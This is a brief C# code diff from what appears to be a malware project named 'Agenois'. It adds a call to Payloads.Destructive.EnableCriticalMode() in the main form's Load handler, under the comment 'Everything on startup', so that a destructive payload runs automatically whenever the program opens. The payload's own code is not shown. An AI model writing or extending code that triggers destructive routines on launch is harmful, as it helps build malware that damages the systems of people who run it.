@@ -39,7 +39,8 @@ namespace Agenois
 
         private void MainThread_Load(object sender, EventArgs e)
         {
-            
+            //Everything on startup.
+            Payloads.Destructive.EnableCriticalMode();
         }
     }
 }
